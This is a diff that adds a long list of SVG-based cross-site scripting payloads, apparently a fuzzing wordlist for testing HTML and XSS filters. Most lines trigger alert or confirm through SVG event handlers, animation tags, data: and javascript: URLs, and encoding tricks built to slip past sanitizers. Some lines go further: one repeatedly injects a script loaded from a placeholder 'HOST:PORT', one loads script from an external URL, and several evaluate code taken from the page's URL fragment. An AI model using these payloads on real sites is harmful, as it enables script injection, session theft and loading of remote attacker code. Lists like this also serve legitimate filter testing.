@@ -1,0 +1,258 @@
+<svg%0Aonload=%09((pro\u006dpt))()//
+<svg 1=""onload=alert(1)>
+<svg><abbr onload=alert(1)></abbr>
+<svg><acronym onload=alert(1)></acronym>
+<svg><address onload=alert(1)></address>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<svg><animate onend=alert(1) attributeName=x dur=1s>
+<svg><animate onrepeat=alert(1) attributeName=x dur=1s repeatCount=2 />
+<svg><animatetransform onbegin=alert(1) attributeName=transform>
+<svg><animatetransform onend=alert(1) attributeName=transform dur=1s>
+<svg><animatetransform onrepeat=alert(1) attributeName=transform repeatCount=2 dur=1s>
+<svg><a onload=alert(1)></a>
+<svg><applet onload=alert(1)></applet>
+<svg><area onload=alert(1)></area>
+<svg><article onload=alert(1)></article>
+<svg><aside onload=alert(1)></aside>
+<svg><audio onload=alert(1)></audio>
+<svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?><circle r=400 /><animate attributeName=xlink:href begin=0 from=javascript:alert(1) to=&>
+<svg><a xmlns:xlink=http://www.w3.org/220999/xlink xlink:href=?><circle r=400 /><animate attributeName=xlink:href begin=0 from=javascript:alert(220) to=%26>
+<svg><basefont onload=alert(1)></basefont>
+<svg><base onload=alert(1)></base>
+<svg><bdi onload=alert(1)></bdi>
+<svg><bdo onload=alert(1)></bdo>
+<svg><bgsound onload=alert(1)></bgsound>
+<svg><big onload=alert(1)></big>
+<svg><blink onload=alert(1)></blink>
+<svg><blockquote onload=alert(1)></blockquote>
+<svg><b onload=alert(1)></b>
+<svg><br onload=alert(1)></br>
+<svg><button onload=alert(1)></button>
+<svg><canvas onload=alert(1)></canvas>
+<svg><caption onload=alert(1)></caption>
+<svg><![CDATA[><image xlink:href="]]><img src=xx:x onerror=alert(2)//"></svg>//["'`-->]]>]</div>
+<svg><center onload=alert(1)></center>
+<svg><cite onload=alert(1)></cite>
+<svg><code onload=alert(1)></code>
+<svg><colgroup onload=alert(1)></colgroup>
+<svg><col onload=alert(1)></col>
+<svg><command onload=alert(1)></command>
+<svg><content onload=alert(1)></content>
+<svg contentScriptType=text/vbs><script>MsgBox+1
+<svg><datalist onload=alert(1)></datalist>
+<svg><data onload=alert(1)></data>
+<svg><dd onload=alert(1)></dd>
+<svg><del onload=alert(1)></del>
+<svg><details onload=alert(1)></details>
+<svg><dfn onload=alert(1)></dfn>
+<svg><dialog onload=alert(1)></dialog>
+<svg><dir onload=alert(1)></dir>
+<svg><discard onbegin=alert(1)>
+</svg>//["'`-->]]>]</div>
+<svg><div onload=alert(1)></div>
+<svg><dl onload=alert(1)></dl>
+<svg draggable="true" ondrag="alert(1)">test</svg>
+<svg draggable="true" ondragend="alert(1)">test</svg>
+<svg draggable="true" ondragenter="alert(1)">test</svg>
+<svg draggable="true" ondragleave="alert(1)">test</svg>
+<svg draggable="true" ondragstart="alert(1)">test</svg>
+<svg><dt onload=alert(1)></dt>
+<svg><element onload=alert(1)></element>
+<svg><em onload=alert(1)></em>
+<svg><fieldset onload=alert(1)></fieldset>
+<svg><figcaption onload=alert(1)></figcaption>
+<svg><figure onload=alert(1)></figure>
+<svg><font onload=alert(1)></font>
+<svg><footer onload=alert(1)></footer>
+<svg><form onload=alert(1)></form>
+<svg><frameset onload=alert(1)></frameset>
+<svg><h1 onload=alert(1)></h1>
+<svg><header onload=alert(1)></header>
+<svg><head onload=alert(1)></head>
+<svg><hgroup onload=alert(1)></hgroup>
+<svg><hr onload=alert(1)></hr>
+<svg><html onload=alert(1)></html>
+<svg id=x onfocus=alert(1)>
+<svg id=x onfocusin=alert(1)>
+<svg id=x tabindex=1 onactivate=alert(1)></svg>
+<svg id=x tabindex=1 onbeforeactivate=alert(1)></svg>
+<svg id=x tabindex=1 onbeforedeactivate=alert(1)></svg><input autofocus>
+<svg id=x tabindex=1 ondeactivate=alert(1)></svg><input id=y autofocus>
+<svg><image href=1 onerror=alert(1)>
+<svg><image href=validimage.png onload=alert(1)>
+<svg><ins onload=alert(1)></ins>
+<svg><i onload=alert(1)></i>
+<svg><kbd onload=alert(1)></kbd>
+<svg><keygen onload=alert(1)></keygen>
+<svg><label onload=alert(1)></label>
+<svg><legend onload=alert(1)></legend>
+<svg><li onload=alert(1)></li>
+<svg><listing onload=alert(1)></listing>
+<svg><main onload=alert(1)></main>
+<svg><map onload=alert(1)></map>
+<svg><mark onload=alert(1)></mark>
+<svg><marquee onload=alert(1)></marquee>
+<svg><menuitem onload=alert(1)></menuitem>
+<svg><menu onload=alert(1)></menu>
+<svg><meta onload=alert(1)></meta>
+<svg><meter onload=alert(1)></meter>
+<svg><multicol onload=alert(1)></multicol>
+<svg><nav onload=alert(1)></nav>
+<svg><nextid onload=alert(1)></nextid>
+<svg><nobr onload=alert(1)></nobr>
+<svg><noembed onload=alert(1)></noembed>
+<svg><noframes onload=alert(1)></noframes>
+<svg><noscript onload=alert(1)></noscript>
+SVG Object Tag
+<svg><ol onload=alert(1)></ol>
+<svg onbeforecopy="alert(1)" contenteditable>test</svg>
+<svg onbeforecut="alert(1)" contenteditable>test</svg>
+<svg onbeforepaste="alert(1)" contenteditable>test</svg>
+<svg onblur=alert(1) tabindex=1 id=x></svg><input autofocus>
+<svg onclick="alert(1)">test</svg>
+<svg oncontextmenu="alert(1)">test</svg>
+<svg oncopy="alert(1)" contenteditable>test</svg>
+<svg oncut="alert(1)" contenteditable>test</svg>
+<svg ondblclick="alert(1)">test</svg>
+<svg onfocusout=alert(1) tabindex=1 id=x></svg><input autofocus>
+<svg onkeydown="alert(1)" contenteditable>test</svg>
+<svg onkeypress="alert(1)" contenteditable>test</svg>
+<svg onkeyup="alert(1)" contenteditable>test</svg>
+<svg </onload ="1> (_=prompt,_(1)) "">
+<SVg </onlOad ="1> (_=prompt,_(1)) "">
+<svg/onload=%26%23097lert%26lpar;1337)>
+"><svg onload=alert(1)//
+<svg onload=(alert)(1)>
+<svg onload=alert(1)>
+<svg/onload=alert(1)
+<svg•onload=alert(1)>
+\<svg/onload=alert`1`\>
+<svg/onload=alert(1161)
+<svg/onload=alert(1698)
+<svg/onload=alert(784)
+<svg/onload=alert(823)
+<svg/onload=alert(91)
+<svg/onload=alert('XSS')>
+<svg/onload=document.location.href='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4='>
+<svg/onload=document.location.href='https://google.com'>
+<svg+onload=eval(location.hash.substr(1))>#alert(1)
+<svg onload=eval(URL.slice(-8))>#alert(93)
+<svg/onload="javascript:alert(103)" xmlns="http://www.baidu.com">
+<svg onload="javascript:alert(123)" xmlns="#"></svg>
+<svg onload="javascript:alert(972)" xmlns="#"></svg>
+<svg/onload=location="javascript:"%2binnerHTML%2blocation.hash>"  #"-alert(107)
+<svg/onload=location='javascript:/*'%2blocation.hash> #*/alert(105)
+<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;// 
+<svg onload=setInterval(function(){with(document)body.appendChild(createElement('script')).src='//HOST:PORT'},0)>
+<svg onLoad svg onLoad="javascript:javascript:alert(1202)"></svg onLoad>
+<svg onload svg onload="javascript:javascript:alert(1248)"></svg onload>
+<svg onload svg onload="javascript:javascript:alert(1)"></svg onload>
+<svg onLoad svg onLoad="javascript:javascript:alert(1)"></svg onLoad>
+<svg onLoad svg onLoad="javascript:javascript:alert(303)"></svg onLoad>
+<svg onload svg onload="javascript:javascript:alert(349)"></svg onload>
+<svg/onload=window.onerror=alert;throw/XSS/;//
+<svg/onload=with(location)with(hash)eval(alert(109))>
+<sVg oNloaD=write()>
+<svg onmousedown="alert(1)">test</svg>
+<svg onmouseenter="alert(1)">test</svg>
+<svg onmouseleave="alert(1)">test</svg>
+<svg onmousemove="alert(1)">test</svg>
+<svg onmouseout="alert(1)">test</svg>
+<svg onmouseover="alert(1)">test</svg>
+<svg onmouseup="alert(1)">test</svg>
+<svg onpaste="alert(1)" contenteditable>test</svg>
+<svg onResize svg onResize="javascript:javascript:alert(1193)"></svg onResize>
+<svg onResize svg onResize="javascript:javascript:alert(1)"></svg onResize>
+<svg onResize svg onResize="javascript:javascript:alert(294)"></svg onResize>
+<svg onUnload svg onUnload="javascript:javascript:alert(1226)"></svg onUnload>
+<svg onunload svg onunload="javascript:javascript:alert(1235)"></svg onunload>
+<svg onunload svg onunload="javascript:javascript:alert(1)"></svg onunload>
+<svg onUnload svg onUnload="javascript:javascript:alert(1)"></svg onUnload>
+<svg onUnload svg onUnload="javascript:javascript:alert(327)"></svg onUnload>
+<svg onunload svg onunload="javascript:javascript:alert(336)"></svg onunload>
+<svg onunload=window.open('javascript:alert(1)')>
+<svg><optgroup onload=alert(1)></optgroup>
+<svg><option onload=alert(1)></option>
+<svg><output onload=alert(1)></output>
+<svg><param onload=alert(1)></param>
+<svg><path><animateMotion onbegin=alert(1) dur="1s" repeatCount="1">
+<svg><path><animateMotion onend=alert(1) dur=1s repeatCount=1>
+<svg><path><animateMotion onrepeat=alert(1) dur="1s" repeatCount="2">
+<svg><picture onload=alert(1)></picture>
+<svg><plaintext onload=alert(1)></plaintext>
+<svg><p onload=alert(1)></p>
+<svg><pre onload=alert(1)></pre>
+<svg><progress onload=alert(1)></progress>
+<svg><q onload=alert(1)></q>
+<svg><rb onload=alert(1)></rb>
+<svg><rp onload=alert(1)></rp>
+<svg><rtc onload=alert(1)></rtc>
+<svg><rt onload=alert(1)></rt>
+<svg><ruby onload=alert(1)></ruby>
+<svg><samp onload=alert(1)></samp>
+<sVg><scRipt %00>alert&lpar;1&rpar; {Opera}
+<svg><script ?>alert(1)
+<svg><script ?>alert(1164)
+<svg><script ?>alert(787)
+<svg><script ?>alert(826)
+<sVg><scRipt >alert&lpar;1&rpar; {Opera}
+<svg><script>//&NewLine;confirm(1);</script </svg>
+<svg><script onlypossibleinopera:-)> alert(1)
+<svg><script onlypossibleinopera:-)> alert(1171)
+<svg><script onlypossibleinopera:-)> alert(1706)
+<svg><script onlypossibleinopera:-)> alert(794)
+<svg><script onlypossibleinopera:-)> alert(833)
+<svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera}
+<svg><script xlink:href=data:,alert(1) /> 
+<svg><script xlink:href=data:,alert(216)></script>
+<svg><script xlink:href=data:,alert(217) />
+<svg><script xlink:href=data&colon;,window.open('https://www.google.com/') </script
+<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script
+<svg><section onload=alert(1)></section>
+<svg><select onload=alert(1)></select>
+<svg><set onbegin=alert(1) attributename=x dur=1s>
+<svg><set onend=alert(1) attributename=x dur=1s>
+<svg><set onrepeat=alert(1) attributename=x dur=1s repeatcount=2>
+<svg><shadow onload=alert(1)></shadow>
+<svg><slot onload=alert(1)></slot>
+<svg><small onload=alert(1)></small>
+<svg><s onload=alert(1)></s>
+<svg><source onload=alert(1)></source>
+<svg><spacer onload=alert(1)></spacer>
+<svg><span onload=alert(1)></span>
+<svg><strike onload=alert(1)></strike>
+<svg><strong onload=alert(1)></strong>
+<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'
+<svg><sub onload=alert(1)></sub>
+<svg><summary onload=alert(1)></summary>
+<svg><sup onload=alert(1)></sup>
+</svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29; {Opera}
+<svg:svg><svg:mask id="maskForClickjacking" maskUnits="objectBoundingBox" maskContentUnits="objectBoundingBox"><svg:rect x="0.0" y="0.0" width="0.373" height="0.3" fill="white"/><svg:circle cx="0.45" cy="0.7" r="0.075" fill="white"/></svg:mask></svg:svg></body>
+<svg><table onload=alert(1)></table>
+<svg><tbody onload=alert(1)></tbody>
+<svg><td onload=alert(1)></td>
+<svg><template onload=alert(1)></template>
+<svg><textarea onload=alert(1)></textarea>
+<svg><tfoot onload=alert(1)></tfoot>
+<svg><thead onload=alert(1)></thead>
+<svg><th onload=alert(1)></th>
+<svg><time onload=alert(1)></time>
+<svg><title onload=alert(1)></title>
+<svg><tr onload=alert(1)></tr>
+<svg><tt onload=alert(1)></tt>
+<svg><ul onload=alert(1)></ul>
+<svg><u onload=alert(1)></u>
+<svg><var onload=alert(1)></var>
+<svg><video onload=alert(1)></video>
+<svg><wbr onload=alert(1)></wbr>
+<svg xmlns="http://www.w3.org/2000/svg">
+<svg xmlns="http://www.w3.org/2000/svg">LOL<script>alert(123)</script></svg>
+<svg xmlns="http://www.w3.org/2000/svg">LOL<script>alert(876)</script></svg>
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
+<svg xmlns="#"><script>alert(1)</script></svg>
+<svg xmlns="#"><script>alert(971)</script></svg>
+<svg><xmp onload=alert(1)></xmp>
+<svG/x=">"/oNloaD=confirm()//
+<svG x=">" onload=(co\u006efirm)``>
+<svg><xss onload=alert(1)></xss>
+<sVG/xss/OnLoaD+="window['confirm']+(1)">
